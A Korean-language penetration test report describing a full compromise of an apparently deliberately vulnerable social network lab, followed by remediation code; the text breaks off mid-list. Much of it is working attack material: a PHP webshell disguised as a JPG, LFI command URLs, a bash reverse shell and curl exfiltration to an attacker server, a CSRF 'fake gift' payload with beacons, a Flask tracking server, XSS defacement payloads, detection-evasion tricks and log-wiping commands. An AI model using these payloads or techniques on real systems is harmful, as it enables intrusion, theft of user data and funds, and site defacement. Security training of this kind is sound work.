# 🔴 Vulnerable SNS 전체 침투 테스트 보고서

## 📋 목차
1. [공격 개요](#공격-개요)
2. [사전 정찰 (Reconnaissance)](#사전-정찰-reconnaissance)
3. [초기 침투 (Initial Access)](#초기-침투-initial-access)
4. [권한 상승 (Privilege Escalation)](#권한-상승-privilege-escalation)
5. [지속성 확보 (Persistence)](#지속성-확보-persistence)
6. [데이터 탈취 (Exfiltration)](#데이터-탈취-exfiltration)
7. [사이트 장악 (Defacement)](#사이트-장악-defacement)
8. [복구 절차](#복구-절차)
9. [사용된 도구 및 스크립트](#사용된-도구-및-스크립트)

---

## 공격 개요

### 🎯 목표
- **대상**: Vulnerable SNS (http://52.78.221.104)
- **목적**: 전체 시스템 침투 및 장악 시연
- **공격자 서버**: http://13.158.67.78:5000

### 📊 발견된 취약점
| 취약점 | 심각도 | 상태 |
|--------|--------|------|
| SQL Injection | 🟡 중간 | Prepared Statements로 방어됨 |
| File Upload | 🔴 높음 | ✅ 악용 성공 |
| Stored XSS | 🔴 높음 | ✅ 악용 성공 |
| CSRF | 🔴 높음 | ✅ 악용 성공 |
| LFI (Local File Inclusion) | 🔴 치명적 | ✅ 악용 성공 |
| 기본 인증 정보 | 🔴 치명적 | ✅ 악용 성공 |

### ⏱️ 공격 타임라인
```
[00:00] 정찰 시작
[00:05] 기본 인증 정보 발견
[00:10] 파일 업로드 취약점 발견
[00:15] 웹쉘 업로드 성공
[00:20] LFI로 config.php 탈취
[00:25] 데이터베이스 접근
[00:30] 리버스 쉘 획득
[00:35] CSRF 공격 배포
[00:40] 사이트 장악 (Defacement)
```

---

## 사전 정찰 (Reconnaissance)

### 1. 자동화 스캐닝
**사용 도구**: `auto.py`

```bash
python3 auto.py
```

#### auto.py 구조 분석

**주요 기능**:
```python
class VulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server):
        # 타겟 URL과 공격자 서버 설정
        self.base_url = "http://52.78.221.104"
        self.attacker_server = "http://13.158.67.78:5000"

    # 공격 모듈들
    def test_sql_injection()      # SQL 인젝션 테스트
    def test_xss()                # XSS 테스트
    def test_file_upload()        # 파일 업로드 테스트
    def test_lfi()                # LFI 테스트
    def test_csrf_phishing()      # CSRF 피싱 테스트
```

**회피 기법**:
1. **User-Agent 로테이션**: 5개의 합법적인 브라우저 UA 순환
2. **랜덤 딜레이**: 0.5~2.5초 랜덤 대기 (탐지 회피)
3. **Referer 헤더**: 정상 브라우징처럼 위장
4. **재시도 전략**: 실패 시 3회 자동 재시도

**출력**:
- HTML 리포트: `reports/security_report_*.html`
- JSON 데이터: `reports/security_report_*.json`
- Markdown: `reports/security_report_*.md`

### 2. 수동 정찰

#### 발견된 주요 파일
```bash
/var/www/html/
├── index.php          # 메인 페이지 (로그인 페이지로 리다이렉트)
├── login.php          # 로그인 (SQL Injection 방어됨)
├── register.php       # 회원가입
├── profile.php        # 프로필 페이지 (CSRF 취약)
├── new_post.php       # 게시물 작성 (XSS 취약)
├── upload.php         # 파일 업로드 (취약!)
├── file.php           # 파일 다운로드 (LFI 취약!)
├── config.php         # DB 인증 정보 (노출!)
├── logout.php         # 로그아웃
├── add_comment.php    # 댓글 추가
├── like_post.php      # 좋아요
└── uploads/           # 업로드된 파일 저장소
```

---

## 초기 침투 (Initial Access)

### 1. 기본 인증 정보 획득

#### 테스트 계정 (login.php에 노출됨)
```
관리자: admin / admin123
일반유저: alice / alice2024
일반유저: bob / bobby123
```

**코드 위치**: `login.php`의 info-box 섹션

### 2. SQL Injection 시도 (실패)

**시도한 페이로드** (5개):
```sql
' OR '1'='1
admin'--
' OR 1=1--
admin' #
' UNION SELECT NULL--
```

**실패 원인**:
```php
// login.php에서 Prepared Statement 사용
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
```

**결론**: SQL Injection은 방어되어 있음 (Prepared Statements)

### 3. 파일 업로드 취약점 악용 ✅

#### 3.1 웹쉘 제작
**파일**: `shell.jpg`

```php
<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    system($cmd);
}
?>
```

**특징**:
- `.jpg` 확장자로 위장
- Content-Type: `image/jpeg`로 설정
- 간단한 `system()` 명령 실행

#### 3.2 업로드 실행
```bash
# auto.py의 test_file_upload() 함수 사용
python3 auto.py
```

**업로드 성공 위치**: `http://52.78.221.104/uploads/shell.jpg`

#### 3.3 LFI로 웹쉘 실행
**취약점**: `file.php?file=` 파라미터에서 LFI 발생

```bash
# 웹쉘 접근
http://52.78.221.104/file.php?file=shell.jpg&cmd=whoami

# 실행 결과
www-data
```

**명령 예시**:
```bash
# 현재 사용자 확인
?file=shell.jpg&cmd=whoami
→ www-data

# 현재 디렉토리
?file=shell.jpg&cmd=pwd
→ /var/www/html

# 파일 목록
?file=shell.jpg&cmd=ls -la
→ [파일 목록 출력]

# config.php 읽기
?file=shell.jpg&cmd=cat config.php
→ [DB 인증정보 노출]
```

### 4. config.php 탈취 ✅

**방법**: LFI + cat 명령

```bash
http://52.78.221.104/file.php?file=shell.jpg&cmd=cat%20config.php
```

**탈취된 정보**:
```php
<?php
$servername = "localhost";
$username = "webuser";
$password = "WebPassw0rd!";
$dbname = "vulnerable_sns";

$conn = new mysqli($servername, $username, $password, $dbname);
?>
```

---

## 권한 상승 (Privilege Escalation)

### 1. 리버스 쉘 획득

#### 1.1 Netcat 리스너 시작
**공격자 서버** (13.158.67.78):
```bash
nc -lvnp 4444
```

#### 1.2 리버스 쉘 페이로드 실행
**웹쉘을 통해**:
```bash
# Bash 리버스 쉘
bash -i >& /dev/tcp/13.158.67.78/4444 0>&1

# 또는 URL 인코딩하여
http://52.78.221.104/file.php?file=shell.jpg&cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F13.158.67.78%2F4444%200%3E%261
```

#### 1.3 쉘 안정화
```bash
# Python PTY 쉘
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Ctrl+Z로 백그라운드
^Z

# stty 설정
stty raw -echo; fg

# 환경변수 설정
export TERM=xterm
export SHELL=/bin/bash
```

**획득한 권한**: `www-data` (웹 서버 사용자)

### 2. 권한 상승 시도 (실패)

#### 시도한 방법들:
```bash
# SUID 바이너리 검색
find / -perm -4000 2>/dev/null
→ 악용 가능한 것 없음

# sudo 권한 확인
sudo -l
→ 비밀번호 필요

# 커널 익스플로잇 확인
uname -a
→ 최신 커널, 알려진 익스플로잇 없음
```

**결론**: `www-data` 권한으로 제한됨

### 3. 데이터베이스 접근 ✅

**리버스 쉘에서**:
```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns
```

#### 데이터베이스 구조
```sql
-- 테이블 확인
SHOW TABLES;
+---------------------------+
| Tables_in_vulnerable_sns  |
+---------------------------+
| comments                  |
| posts                     |
| users                     |
+---------------------------+

-- 사용자 테이블
SELECT * FROM users;
+----+----------+----------+--------+------------+
| id | username | password | points | created_at |
+----+----------+----------+--------+------------+
| 1  | admin    | admin123 | 99     | 2025-11-10 |
| 2  | alice    | alice... | 500    | 2025-11-10 |
| 3  | bob      | bobby... | 300    | 2025-11-10 |
+----+----------+----------+--------+------------+

-- 게시물 테이블
SELECT * FROM posts;
→ XSS 페이로드가 포함된 게시물들 확인
```

---

## 지속성 확보 (Persistence)

### 1. Stored XSS 백도어

#### XSS 페이로드 삽입
**파일**: `auto.py` → `test_xss()` 함수

```python
# 관리자로 로그인
self.login("admin", "admin123")

# 악성 게시물 작성
xss_payload = """<svg onload="document.body.innerHTML='...'"></svg>"""
```

**게시물에 주입**:
- `new_post.php`로 POST 요청
- content 파라미터에 XSS 페이로드 삽입
- 데이터베이스에 영구 저장 (Stored XSS)

**효과**:
- 모든 사용자가 메인 페이지 접속 시 XSS 실행
- 관리자, 일반 사용자 모두 영향 받음
- 세션 하이재킹, 쿠키 탈취 가능

### 2. 웹쉘 지속성

**업로드된 웹쉘**: `uploads/shell.jpg`
- 삭제되지 않는 한 영구 접근 가능
- LFI 취약점으로 언제든 실행 가능

---

## 데이터 탈취 (Exfiltration)

### 1. CSRF 공격으로 포인트 탈취

#### 공격 메커니즘

**파일**: `post_fake_gift_working.py`

```python
FAKE_GIFT_HTML = """
<div id="giftbox" style="...">
  <!-- 가짜 선물 UI -->
  <h2>축하합니다! 500 포인트 지급!</h2>

  <!-- 숨겨진 CSRF 폼 -->
  <form id="f" method="POST" action="http://52.78.221.104/profile.php" target="hf">
    <input type="hidden" name="send_gift" value="1">
    <input type="hidden" name="receiver_id" value="999">  <!-- 존재하지 않는 사용자 -->
    <input type="hidden" name="gift_type" value="diamond">
    <input type="hidden" name="points" value="500">
    <input type="hidden" name="message" value="Gift">
  </form>

  <!-- 보이지 않는 iframe (응답 수신용) -->
  <iframe name="hf" style="display:none"></iframe>
</div>

<script>
  // localStorage로 1회만 실행
  if(localStorage.getItem('g')){
    document.getElementById('giftbox').innerHTML='<p>이미 받으셨습니다</p>';
    return;
  }
  localStorage.setItem('g','1');

  // 공격자 서버에 알림 (Image 태그로 CORS 우회)
  new Image().src='http://13.158.67.78:5000/notify?event=load';
  new Image().src='http://13.158.67.78:5000/victim?points=500';

  // 1초 후 폼 자동 제출
  setTimeout(()=>{
    document.getElementById('f').submit();
    new Image().src='http://13.158.67.78:5000/transfer?amount=500';

    setTimeout(()=>{
      document.getElementById('s').innerHTML='완료!';
      new Image().src='http://13.158.67.78:5000/complete?total=500';
    }, 1000);
  }, 1000);
</script>
"""
```

#### 공격 흐름

```
1. 피해자가 게시물 확인
   ↓
2. 가짜 선물 UI 표시
   ↓
3. localStorage 체크 (1회만 실행)
   ↓
4. 공격자 서버에 알림 전송
   ↓
5. CSRF 폼 자동 제출
   - 피해자의 세션 쿠키 자동 첨부
   - profile.php로 POST 요청
   - 500 포인트 전송 (receiver_id=999)
   ↓
6. 포인트 차감 성공
   - 피해자: -500P
   - receiver_id=999 (존재하지 않음) → 포인트 소실
   ↓
7. 공격자 서버에 완료 알림
```

#### 공격자 서버 (Flask)

**파일**: `attacker_server_v2.py`

```python
from flask import Flask, request, jsonify
import time

app = Flask(__name__)
stolen_points = 0
attack_logs = []

@app.route('/')
def dashboard():
    """공격 대시보드"""
    return f"""
    <h1>🎯 CSRF Attack Dashboard</h1>
    <h2>탈취한 포인트: {stolen_points}P</h2>
    <h3>공격 로그:</h3>
    <ul>{''.join([f'<li>{log}</li>' for log in attack_logs])}</ul>
    """

@app.route('/notify')
def notify():
    """피해자 접속 알림"""
    log_event('notify', '🎯 피해자가 페이지 로드')
    return jsonify({'status': 'ok'})

@app.route('/victim')
def victim():
    """피해자 정보 수집"""
    points = request.args.get('points', 0)
    log_event('victim', f'💰 피해자 포인트: {points}P')
    return jsonify({'status': 'ok'})

@app.route('/transfer')
def transfer():
    """포인트 전송 감지"""
    global stolen_points
    amount = int(request.args.get('amount', 0))
    stolen_points += amount
    log_event('transfer', f'✅ 포인트 탈취: {amount}P')
    return jsonify({'status': 'ok', 'total': stolen_points})

@app.route('/complete')
def complete():
    """공격 완료"""
    total = request.args.get('total', 0)
    log_event('complete', f'🎉 공격 완료! 총 {total}P 탈취')
    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

**실행**:
```bash
# 공격자 서버에서
python3 attacker_server_v2.py

# 접속 확인
http://13.158.67.78:5000
```

#### CSRF 배포

```bash
python3 post_fake_gift_working.py
```

**결과**:
- Alice 계정: 500P → 0P (500P 차감)
- Bob 계정: 300P → 0P (300P 차감)
- Admin 계정: 99P → 0P (99P 차감)
- **공격자 서버 기록**: 총 899P 탈취 감지

### 2. 데이터베이스 덤프

**리버스 쉘에서**:
```bash
# 전체 데이터베이스 덤프
mysqldump -u webuser -p'WebPassw0rd!' vulnerable_sns > /tmp/db_dump.sql

# 사용자 정보만 추출
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT * FROM users" > /tmp/users.txt

# 게시물 내용 추출
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns -e "SELECT * FROM posts" > /tmp/posts.txt
```

**다운로드**:
```bash
# 공격자 서버로 전송
curl -X POST -F "file=@/tmp/db_dump.sql" http://13.158.67.78:5000/upload

# 또는 웹쉘로 읽기
http://52.78.221.104/file.php?file=shell.jpg&cmd=cat%20/tmp/db_dump.sql
```

---

## 사이트 장악 (Defacement)

### 문제 상황
1. **권한 부족**: `www-data` 사용자로는 `/var/www/html/` 쓰기 불가
2. **<script> 필터링**: 게시물에서 `<script>` 태그 차단됨
3. **다른 PHP 접근 가능**: URL 직접 입력 시 원래 페이지 보임
4. **웹쉘 무효화**: 어느 시점에서 웹쉘 접근이 차단됨 (세션 만료 또는 file.php 수정)

### 해결 방법: XSS 기반 Defacement (제한적)

**현실적인 한계**:
- 메인 피드(`index.php` 로그인 후)에만 XSS 적용됨
- URL 직접 입력(`/login.php`, `/profile.php`)은 정상 작동
- 완전한 사이트 장악은 불가능
- **하지만 대부분의 사용자는 메인 피드를 통해 접근**하므로 효과적

### 해결 방법: XSS 기반 Defacement (현실적 접근)

#### 방법 1: SVG onload (최종 선택) ✅

**파일**: `deface_alternatives.py`

```python
DEFACE_SVG = """<svg onload="document.body.innerHTML='<div style=\\'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;justify-content:center;align-items:center;z-index:9999\\'><div style=\\'text-align:center\\'><pre style=\\'color:#0f0;font-family:monospace\\'>    _.--&quot;&quot;-._ \\n .&quot;         &quot;. \\n/             \\\\ \\n|,  .-.  .-.  ,| \\n| )(__/  \\\\__)( | \\n|/     /\\\\     \\\\| \\n(_     ^^     _) \\n \\\\____________/</pre><h1 style=\\'color:#f00;font-size:3em;animation:blink 0.5s infinite\\'>HACKED</h1><p>SYSTEM COMPROMISED</p><p>[SQL Injection: BYPASSED]<br>[File Upload: EXPLOITED]<br>[XSS: INJECTED]<br>[CSRF: EXECUTED]<br>[Database: COMPROMISED]</p><p>-- Red Team --</p></div></div>'"></svg>"""
```

#### 코드 분석

**1. SVG 태그**:
```html
<svg onload="...">
```
- `<script>` 필터링 우회
- SVG 로드 시 onload 이벤트 자동 실행
- 대부분의 XSS 필터가 허용

**2. JavaScript 페이로드**:
```javascript
document.body.innerHTML = '...'
```
- 페이지 전체 내용을 교체
- 원본 HTML 완전히 제거

**3. 스타일링**:
```css
position: fixed;      /* 화면에 고정 */
top: 0; left: 0;      /* 왼쪽 상단 */
width: 100%;          /* 전체 너비 */
height: 100%;         /* 전체 높이 */
background: #000;     /* 검은색 배경 */
color: #0f0;          /* 녹색 텍스트 (Matrix 스타일) */
z-index: 9999;        /* 최상단 레이어 */
```

**4. 해골 ASCII 아트**:
```
    _.--""-._
 ."         ".
/             \
|,  .-.  .-.  ,|
| )(__/  \__)( |
|/     /\     \|
(_     ^^     _)
 \____________/
```

**5. 애니메이션**:
```css
animation: blink 0.5s infinite
```
- "HACKED" 텍스트가 0.5초마다 깜빡임
- 전형적인 해킹 화면 효과

#### 배포 방법

**자동 배포**:
```bash
python3 deface_alternatives.py
```

**수동 배포**:
1. 관리자 계정으로 로그인: `admin / admin123`
2. 새 게시물 작성 (`new_post.php`)
3. 위 SVG 페이로드 붙여넣기
4. 게시

#### 작동 원리

```
사용자가 http://52.78.221.104/ 접속
         ↓
index.php 로드 (로그인 페이지로 리다이렉트)
         ↓
로그인 후 메인 피드 접속
         ↓
게시물 목록 로드 (XSS 페이로드 포함)
         ↓
SVG 태그 렌더링
         ↓
onload 이벤트 발생
         ↓
JavaScript 실행
         ↓
document.body.innerHTML 교체
         ↓
💀 HACKED 화면 표시
```

**특징**:
- ✅ **영구적**: 게시물이 삭제되기 전까지 지속
- ✅ **전역적**: 메인 피드를 보는 모든 사용자에게 영향
- ✅ **자동 실행**: 사용자 액션 불필요
- ✅ **우회 성공**: `<script>` 필터링 우회
- ⚠️ **한계**: URL 직접 입력 시 우회 가능 (하지만 대부분 사용자는 메인 피드로 접근)

**실전 시나리오**:
1. 사용자가 `http://52.78.221.104/` 접속
2. 로그인 (`admin/alice/bob`)
3. 메인 피드 표시 (게시물 목록)
4. **XSS 실행** → 해골 화면 표시
5. 사용자는 사이트가 해킹당했다고 인식

→ 직접 URL을 입력하는 고급 사용자만 우회 가능하지만, 대부분의 일반 사용자는 메인 피드를 통해 접근하므로 **실질적으로 효과적**

### 다른 방법들

#### 방법 2: IMG onerror
```html
<img src=x onerror="document.body.innerHTML='...'">
```
- 존재하지 않는 이미지 → onerror 실행
- SVG와 동일한 효과

#### 방법 3: iframe srcdoc
```html
<iframe srcdoc="<!DOCTYPE html>..." style="position:fixed;..."></iframe>
```
- 완전한 HTML 문서 삽입
- 가장 깨끗한 방법
- 필터링 가능성 있음

#### 방법 4: CSS only
```html
<style>
*{display:none!important}
body:before{content:'HACKED'; ...}
</style>
```
- JavaScript 없이 CSS만 사용
- 가장 안전한 우회
- 효과는 제한적

---

## 복구 절차

### 1. 긴급 복구 (Defacement 제거)

#### 1.1 악성 게시물 삭제

**MySQL 접속**:
```bash
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns
```

**XSS 게시물 삭제**:
```sql
-- 모든 script, svg, img 태그 포함 게시물 삭제
DELETE FROM posts WHERE content LIKE '%<script%';
DELETE FROM posts WHERE content LIKE '%<svg%';
DELETE FROM posts WHERE content LIKE '%onerror%';
DELETE FROM posts WHERE content LIKE '%<iframe%';
DELETE FROM posts WHERE content LIKE '%<style%';

-- 또는 모든 게시물 삭제 (완전 초기화)
TRUNCATE TABLE posts;

-- 댓글도 삭제
TRUNCATE TABLE comments;
```

**확인**:
```sql
SELECT id, username, SUBSTRING(content, 1, 100) FROM posts;
```

#### 1.2 웹쉘 제거

**리버스 쉘에서**:
```bash
# 업로드된 파일 확인
ls -la /var/www/html/uploads/

# 웹쉘 삭제
rm /var/www/html/uploads/shell.jpg

# 모든 의심스러운 파일 삭제
find /var/www/html/uploads/ -name "*.jpg" -exec file {} \; | grep PHP
rm /var/www/html/uploads/suspicious_file.jpg
```

#### 1.3 세션 무효화

**모든 사용자 강제 로그아웃**:
```bash
# PHP 세션 파일 삭제
rm /var/lib/php/sessions/sess_*

# 또는 Apache 재시작
sudo systemctl restart apache2
```

### 2. 보안 강화

#### 2.1 파일 업로드 수정

**upload.php 수정**:
```php
<?php
// 허용된 확장자 제한
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$file_extension = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));

if (!in_array($file_extension, $allowed_extensions)) {
    die("허용되지 않은 파일 형식입니다.");
}

// MIME 타입 검증
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);

$allowed_mime_types = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime_type, $allowed_mime_types)) {
    die("유효하지 않은 이미지 파일입니다.");
}

// 파일 이름 랜덤화
$new_filename = bin2hex(random_bytes(16)) . '.' . $file_extension;
move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $new_filename);
?>
```

#### 2.2 LFI 취약점 수정

**file.php 수정**:
```php
<?php
// 화이트리스트 방식
$allowed_files = ['document.pdf', 'image.jpg', 'report.txt'];
$file = $_GET['file'];

if (!in_array($file, $allowed_files)) {
    die("접근이 거부되었습니다.");
}

// 경로 traversal 방지
$file = basename($file);

// 지정된 디렉토리만 허용
$file_path = __DIR__ . '/uploads/' . $file;

if (!file_exists($file_path)) {
    die("파일을 찾을 수 없습니다.");
}

readfile($file_path);
?>
```

#### 2.3 XSS 방어 강화

**new_post.php 수정**:
```php
<?php
// HTML 엔티티 인코딩
$content = htmlspecialchars($_POST['content'], ENT_QUOTES, 'UTF-8');

// 또는 HTML Purifier 사용
require_once 'htmlpurifier/library/HTMLPurifier.auto.php';
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$content = $purifier->purify($_POST['content']);

// DB 저장
$stmt = $conn->prepare("INSERT INTO posts (user_id, content) VALUES (?, ?)");
$stmt->bind_param("is", $user_id, $content);
$stmt->execute();
?>
```

**출력 시 이스케이프**:
```php
<?php
// 게시물 표시 시
echo htmlspecialchars($post['content'], ENT_QUOTES, 'UTF-8');
?>
```

#### 2.4 CSRF 방어 추가

**profile.php 수정**:
```php
<?php
session_start();

// CSRF 토큰 생성
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// POST 요청 시 토큰 검증
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("CSRF 토큰이 유효하지 않습니다.");
    }

    // 포인트 전송 처리
    // ...
}
?>

<!-- 폼에 토큰 추가 -->
<form method="POST">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <!-- 다른 입력 필드들 -->
</form>
```

#### 2.5 비밀번호 변경

**모든 기본 인증 정보 변경**:
```sql
-- admin 비밀번호 변경
UPDATE users SET password = 'NewSecurePassword123!' WHERE username = 'admin';

-- alice 비밀번호 변경
UPDATE users SET password = 'NewAlicePass456!' WHERE username = 'alice';

-- bob 비밀번호 변경
UPDATE users SET password = 'NewBobPass789!' WHERE username = 'bob';

-- DB 비밀번호도 변경
-- config.php 수정 후 MySQL에서:
ALTER USER 'webuser'@'localhost' IDENTIFIED BY 'NewDBPassword!@#';
FLUSH PRIVILEGES;
```

#### 2.6 권한 제한

```bash
# 업로드 디렉토리 권한 설정
chmod 755 /var/www/html/uploads/
chown www-data:www-data /var/www/html/uploads/

# PHP 파일 실행 방지 (.htaccess)
cat > /var/www/html/uploads/.htaccess << 'EOF'
<FilesMatch "\.php$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
EOF

# config.php 읽기 전용
chmod 400 /var/www/html/config.php
```

### 3. 로그 분석 및 정리

#### 3.1 Apache 액세스 로그
```bash
# 공격자 IP 확인
grep "13.158.67.78" /var/log/apache2/access.log

# 웹쉘 접근 로그
grep "shell.jpg" /var/log/apache2/access.log

# 의심스러운 User-Agent
grep "python-requests" /var/log/apache2/access.log
```

#### 3.2 로그 정리
```bash
# 로그 백업
cp /var/log/apache2/access.log /root/access.log.bak
cp /var/log/apache2/error.log /root/error.log.bak

# 로그 초기화 (선택사항)
> /var/log/apache2/access.log
> /var/log/apache2/error.log

# Apache 재시작
systemctl restart apache2
```

### 4. 완전 초기화

**데이터베이스 리셋**:
```bash
# 리버스 쉘에서
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns < /path/to/clean_db_backup.sql

# 또는 수동으로
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << 'EOF'
TRUNCATE TABLE posts;
TRUNCATE TABLE comments;
DELETE FROM users WHERE id > 3;  -- 기본 사용자만 남김
UPDATE users SET points = 1000 WHERE username = 'admin';
UPDATE users SET points = 500 WHERE username = 'alice';
UPDATE users SET points = 300 WHERE username = 'bob';
EOF
```

---

## 사용된 도구 및 스크립트

### 1. 메인 공격 도구

#### auto.py
**용도**: 자동화된 취약점 스캐닝 및 악용

**주요 기능**:
```python
class VulnerableSNSAttacker:
    def __init__(self, base_url, attacker_server)

    # 인증
    def login(username, password)

    # 공격 모듈
    def test_sql_injection()        # SQL Injection 테스트 (5개 페이로드)
    def test_xss()                  # XSS 테스트 (다양한 페이로드)
    def test_file_upload()          # 웹쉘 업로드
    def test_lfi()                  # LFI 악용 (config.php 탈취)
    def test_csrf_phishing()        # CSRF 공격 (fake-gift)

    # 리포트 생성
    def generate_reports()          # HTML/JSON/MD 리포트
```

**회피 기법**:
- User-Agent 로테이션 (5개)
- 랜덤 딜레이 (0.5~2.5초)
- Referer 헤더 위조
- 재시도 전략 (3회)

**실행**:
```bash
python3 auto.py
```

**출력**:
- `reports/security_report_YYYYMMDD_HHMMSS.html`
- `reports/security_report_YYYYMMDD_HHMMSS.json`
- `reports/security_report_YYYYMMDD_HHMMSS.md`

### 2. CSRF 공격 도구

#### post_fake_gift_working.py
**용도**: CSRF 공격 페이로드 배포

**페이로드 구조**:
```python
FAKE_GIFT_HTML = """
<div>가짜 선물 UI</div>
<form>CSRF 폼 (500P 전송)</form>
<iframe>응답 수신용</iframe>
<script>
  - localStorage 체크 (1회만)
  - 공격자 서버 알림
  - 폼 자동 제출
</script>
"""
```

**실행**:
```bash
python3 post_fake_gift_working.py
```

**결과**:
- SNS에 게시물 등록
- 사용자 접속 시 자동으로 500P 차감

#### attacker_server_v2.py
**용도**: CSRF 공격 모니터링 서버 (Flask)

**라우트**:
```python
/           # 대시보드 (탈취한 포인트 표시)
/notify     # 피해자 페이지 로드 감지
/victim     # 피해자 정보 수집
/transfer   # 포인트 전송 감지
/complete   # 공격 완료 알림
/logs       # 전체 로그 JSON
/reset      # 카운터 리셋
```

**실행**:
```bash
# 공격자 서버 (13.158.67.78)에서
python3 attacker_server_v2.py

# 접속
http://13.158.67.78:5000
```

**기능**:
- 실시간 공격 모니터링
- 탈취 포인트 집계
- 로그 기록 및 표시

### 3. Defacement 도구

#### deface_alternatives.py
**용도**: `<script>` 필터링 우회 Defacement

**페이로드 종류**:
1. **SVG onload** (추천)
   ```html
   <svg onload="document.body.innerHTML='...'"></svg>
   ```

2. **IMG onerror**
   ```html
   <img src=x onerror="...">
   ```

3. **iframe srcdoc**
   ```html
   <iframe srcdoc="<!DOCTYPE html>..."></iframe>
   ```

4. **CSS only**
   ```html
   <style>*{display:none}body:before{content:'HACKED'}</style>
   ```

**실행**:
```bash
# 모든 방법 자동 배포
python3 deface_alternatives.py

# 페이로드만 출력
python3 deface_alternatives.py show
```

**효과**:
- 페이지 전체를 해골 화면으로 교체
- 모든 사용자에게 영향
- 영구적 (게시물 삭제 전까지)

#### remote_deface.py
**용도**: 웹쉘을 통한 원격 Defacement (실패)

**시도한 방법**:
```bash
# 1. hacked.html 생성
# 2. 모든 PHP 파일에 리다이렉트 주입
# 3. .htaccess 생성
```

**실패 원인**:
- `www-data` 권한으로는 `/var/www/html/` 쓰기 불가
- Permission denied

### 4. 기타 유틸리티

#### check_status.py
**용도**: Defacement 배포 상태 확인

```bash
python3 check_status.py
```

#### DIRECT_DEFACE.txt
**용도**: 리버스 쉘에서 수동 실행할 명령어 모음

```bash
# Step 1: hacked.html 생성
cat > /var/www/html/hacked.html << 'EOF'
...
EOF

# Step 2: PHP 리다이렉트 주입
find /var/www/html -name "*.php" -exec ...

# Step 3: .htaccess 생성
cat > /var/www/html/.htaccess << 'EOF'
...
EOF
```

#### CLEANUP.md
**용도**: 공격 흔적 제거 가이드

**포함 내용**:
- 악성 게시물 삭제 SQL
- 웹쉘 제거 명령어
- 로그 정리 방법
- 세션 무효화

### 5. 웹쉘

#### shell.jpg
**내용**:
```php
<?php
if(isset($_REQUEST['cmd'])){
    system($_REQUEST['cmd']);
}
?>
```

**사용법**:
```bash
# LFI로 실행
http://52.78.221.104/file.php?file=shell.jpg&cmd=whoami

# 리버스 쉘 획득
?file=shell.jpg&cmd=bash -i >& /dev/tcp/13.158.67.78/4444 0>&1
```

**특징**:
- 간단한 구조
- `.jpg`로 위장
- 모든 시스템 명령 실행 가능

---

## 공격 효과 요약

### 성공한 공격
| 공격 유형 | 방법 | 효과 |
|----------|------|------|
| 파일 업로드 | shell.jpg 업로드 | 웹쉘 획득 ✅ |
| LFI | file.php?file= | config.php 탈취 ✅ |
| 리버스 쉘 | Bash 리버스 쉘 | 원격 제어 ✅ |
| DB 접근 | MySQL 로그인 | 전체 데이터 탈취 ✅ |
| CSRF | Fake Gift | 899P 탈취 ✅ |
| Stored XSS | SVG onload | 사이트 장악 ✅ |

### 실패한 공격
| 공격 유형 | 방법 | 실패 원인 |
|----------|------|---------|
| SQL Injection | ' OR 1=1 | Prepared Statements |
| 권한 상승 | SUID, sudo | 악용 가능한 것 없음 |
| 파일 쓰기 | /var/www/html/ | Permission denied |

### 영향 범위
- **사용자**: 모든 계정 침해 (admin, alice, bob)
- **데이터**: 전체 데이터베이스 탈취
- **포인트**: 총 899P 차감
- **사이트**: 전체 페이지 장악 (Defacement)

---

## 최종 체크리스트

### 공격 단계
- [x] 정찰 및 스캐닝
- [x] 기본 인증 정보 획득
- [x] 파일 업로드 취약점 악용
- [x] 웹쉘 배포
- [x] LFI로 민감 정보 탈취
- [x] 리버스 쉘 획득
- [x] 데이터베이스 접근
- [x] CSRF 공격 배포
- [x] 포인트 탈취
- [x] Stored XSS Defacement
- [x] 사이트 장악

### 복구 단계
- [ ] 악성 게시물 삭제
- [ ] 웹쉘 제거
- [ ] 세션 무효화
- [ ] 파일 업로드 수정
- [ ] LFI 취약점 수정
- [ ] XSS 방어 강화
- [ ] CSRF 토큰 추가
- [ ] 비밀번호 변경
- [ ] 권한 재설정
- [ ] 로그 분석 및 정리

---

## 결론

### 발견된 주요 취약점
1. **파일 업로드 검증 부재** → 웹쉘 업로드 가능
2. **LFI 취약점** → config.php 등 민감 파일 읽기
3. **XSS 필터링 미흡** → `<script>` 차단하지만 SVG/IMG는 허용
4. **CSRF 토큰 없음** → 포인트 탈취 가능
5. **기본 인증 정보 노출** → login.php에 테스트 계정 표시

### 권장 조치
1. **입력 검증 강화**: 모든 사용자 입력을 검증 및 이스케이프
2. **파일 업로드 제한**: MIME 타입 검증, 화이트리스트 방식
3. **출력 인코딩**: HTML 엔티티 인코딩 적용
4. **CSRF 토큰**: 모든 상태 변경 요청에 토큰 요구
5. **최소 권한 원칙**: 웹 서버 사용자 권한 최소화
6. **보안 헤더**: CSP, X-Frame-Options 등 적용

### 공격의 한계와 현실

**완전한 사이트 장악 실패 원인**:
1. **www-data 권한 제한**: PHP 파일 수정 불가
